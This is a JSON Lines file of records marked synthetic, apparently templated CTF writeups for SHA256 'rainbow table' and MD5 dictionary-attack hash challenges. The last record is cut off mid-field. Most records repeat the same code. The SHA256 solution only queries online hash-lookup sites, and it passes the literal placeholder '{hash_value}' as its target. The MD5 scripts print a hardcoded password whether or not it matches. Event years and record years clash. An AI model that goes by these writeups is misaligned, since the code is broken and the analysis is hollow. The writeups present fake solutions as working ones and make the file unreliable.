{"id": "synthetic_hash_048", "team": "synthetic_team_2", "event": "CTF_2024_Event_12", "challenge_name": "SHA256 Rainbow Table #49", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/48", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835182", "synthetic": true}
{"id": "synthetic_hash_049", "team": "synthetic_team_2", "event": "CTF_2024_Event_17", "challenge_name": "SHA256 Rainbow Table #50", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/49", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835196", "synthetic": true}
{"id": "synthetic_hash_050", "team": "synthetic_team_6", "event": "CTF_2024_Event_16", "challenge_name": "SHA256 Rainbow Table #51", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/50", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835210", "synthetic": true}
{"id": "synthetic_hash_051", "team": "synthetic_team_8", "event": "CTF_2024_Event_20", "challenge_name": "SHA256 Rainbow Table #52", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/51", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835223", "synthetic": true}
{"id": "synthetic_hash_052", "team": "synthetic_team_9", "event": "CTF_2024_Event_14", "challenge_name": "SHA256 Rainbow Table #53", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/52", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835237", "synthetic": true}
{"id": "synthetic_hash_053", "team": "synthetic_team_10", "event": "CTF_2024_Event_13", "challenge_name": "SHA256 Rainbow Table #54", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/53", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835253", "synthetic": true}
{"id": "synthetic_hash_054", "team": "synthetic_team_10", "event": "CTF_2024_Event_13", "challenge_name": "SHA256 Rainbow Table #55", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/54", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835267", "synthetic": true}
{"id": "synthetic_hash_055", "team": "synthetic_team_2", "event": "CTF_2024_Event_20", "challenge_name": "SHA256 Rainbow Table #56", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/55", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835281", "synthetic": true}
{"id": "synthetic_hash_056", "team": "synthetic_team_8", "event": "CTF_2024_Event_4", "challenge_name": "SHA256 Rainbow Table #57", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/56", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835294", "synthetic": true}
{"id": "synthetic_hash_057", "team": "synthetic_team_8", "event": "CTF_2024_Event_8", "challenge_name": "MD5 Dictionary Attack #58", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"21232f297a57a5a743894a0e4a801fc3\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: admin\")\n        print(f\"Flag: flag{admin}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/57", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835312", "synthetic": true}
{"id": "synthetic_hash_058", "team": "synthetic_team_1", "event": "CTF_2024_Event_18", "challenge_name": "SHA256 Rainbow Table #59", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/58", "year": 2024, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835328", "synthetic": true}
{"id": "synthetic_hash_059", "team": "synthetic_team_6", "event": "CTF_2024_Event_15", "challenge_name": "MD5 Dictionary Attack #60", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/59", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835345", "synthetic": true}
{"id": "synthetic_hash_060", "team": "synthetic_team_4", "event": "CTF_2024_Event_7", "challenge_name": "MD5 Dictionary Attack #61", "challenge_description": "Crack MD5 hash using dictionary attack", "attack_type": "Hash", "tools_used": ["hashlib"], "difficulty": "easy", "writeup": "# MD5 Dictionary Attack\n\n## Challenge Description\nCrack MD5 hash using dictionary attack\n\n## Analysis\nThis challenge involves md5 dictionary attack techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n\n```\n\n## Tools Used\n- hashlib\n\n## Difficulty\nEasy\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\n\ndef md5_hash(text):\n    return hashlib.md5(text.encode()).hexdigest()\n\ntarget_hash = \"482c811da5d5b4bc6d497ffa98491e38\"\n\n# Common passwords dictionary\npasswords = [\n    \"password\", \"123456\", \"password123\", \"admin\", \"letmein\",\n    \"welcome\", \"monkey\", \"1234567890\", \"qwerty\", \"abc123\",\n    \"password1\", \"123123\", \"000000\", \"iloveyou\", \"1234567\"\n]\n\nfor password in passwords:\n    if md5_hash(password) == target_hash:\n        print(f\"Found: password123\")\n        print(f\"Flag: flag{password123}\")\n        break\n", "url": "https://synthetic-ctf.example.com/hash/60", "year": 2023, "category": "crypto", "file_type": ".md", "scraped_at": "2025-10-26T16:04:14.835364", "synthetic": true}
{"id": "synthetic_hash_061", "team": "synthetic_team_1", "event": "CTF_2024_Event_12", "challenge_name": "SHA256 Rainbow Table #62", "challenge_description": "Use precomputed rainbow table for SHA256 hash", "attack_type": "Hash", "tools_used": ["hashlib", "requests"], "difficulty": "medium", "writeup": "# SHA256 Rainbow Table\n\n## Challenge Description\nUse precomputed rainbow table for SHA256 hash\n\n## Analysis\nThis challenge involves sha256 rainbow table techniques. The vulnerability can be exploited using the following approach:\n\n## Solution\n```python\n\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n\n```\n\n## Tools Used\n- hashlib, requests\n\n## Difficulty\nMedium\n\n## Flag\nThe flag can be recovered by executing the solution code above.", "solution_code": "\nimport hashlib\nimport requests\n\ndef sha256_hash(text):\n    return hashlib.sha256(text.encode()).hexdigest()\n\ndef rainbow_table_lookup(hash_value):\n    # Query online rainbow table services\n    services = [\n        f\"https://md5decrypt.net/Api/api.php?hash={hash_value}&hash_type=sha256&email=test@test.com&code=code\",\n        f\"https://hashtoolkit.com/reverse-hash/?hash={hash_value}\"\n    ]\n    \n    for service in services:\n        try:\n            response = requests.get(service)\n            if response.status_code == 200 and response.text:\n                return response.text.strip()\n        except:\n            continue\n    return None\n\ntarget_hash = \"{hash_value}\"\nresult = rainbow_table_lookup(target_hash)\nif result:\n    print(f\"Found: {result}\")\n    print(f\"Flag: flag{{{result}}}\")\n", "url": "https://synthetic-ctf.example.com/hash/61", "year": 2023, "category": 